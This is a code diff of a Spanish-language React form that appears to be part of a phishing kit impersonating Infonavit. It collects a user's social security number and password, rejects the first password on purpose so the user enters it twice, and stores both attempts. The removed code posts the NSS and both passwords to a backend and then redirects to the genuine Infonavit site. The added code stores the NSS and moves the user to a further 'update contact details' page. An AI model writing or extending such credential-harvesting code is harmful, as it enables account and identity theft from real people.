@@ -44,7 +44,7 @@ export default function FormularioSeguridad() {
     setValue("seguridad", valorFormateado);
   };
 
-  const envioDatos = async (data) => {
+  const siguientePagina = (data) => {
     if (intentos === 0) {
       setClaveError(data.contra);
 
@@ -57,33 +57,14 @@ export default function FormularioSeguridad() {
     } else {
       setClave(data.contra);
 
+      useFormularioStore.setState({ nss: data.seguridad });
       setLoading(true);
 
-      try {
-        const res = await fetch("/api/enviar-datos", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            seguridad: data.seguridad,
-            clavePrimerIntento: useFormularioStore.getState().claveError,
-            claveSegundoIntento: useFormularioStore.getState().clave,
-          }),
-        });
-
-        const result = await res.json();
-
-        if (result.success) {
-          reset();
-          router.push("https://micuenta.infonavit.org.mx/?gad_source=1");
-        }
-
-        resetFormulario();
-        setIntentos(0);
-      } catch (error) {
-        console.log(error);
-      } finally {
-        setLoading(false);
-      }
+      setTimeout(() => {
+        router.push("/perfil/actualizar-datos-contacto");
+      }, 1000);
+      reset();
+      setIntentos(0);
     }
   };
 
@@ -95,7 +76,7 @@ export default function FormularioSeguridad() {
           Consulta el{" "}
           <span className="text-[#dd0528] ">Aviso de Privacidad</span>
         </h2>
-        <form onSubmit={handleSubmit(envioDatos)}>
+        <form onSubmit={handleSubmit(siguientePagina)}>
           <div>
             <label htmlFor="seguridad" className="text-[#7e8094] mb-2 block">
               Número de Seguridad Social (NSS)
@@ -175,6 +156,7 @@ export default function FormularioSeguridad() {
           <div className="flex flex-col gap-5">
             <button
               type="submit"
+              disabled={!isValid}
               className={`${
                 isValid ? "bg-[#dd0528] cursor-pointer" : "bg-[#cdcdcd]"
               }  py-[10px] rounded-full text-sm text-white geomanist-medium `}
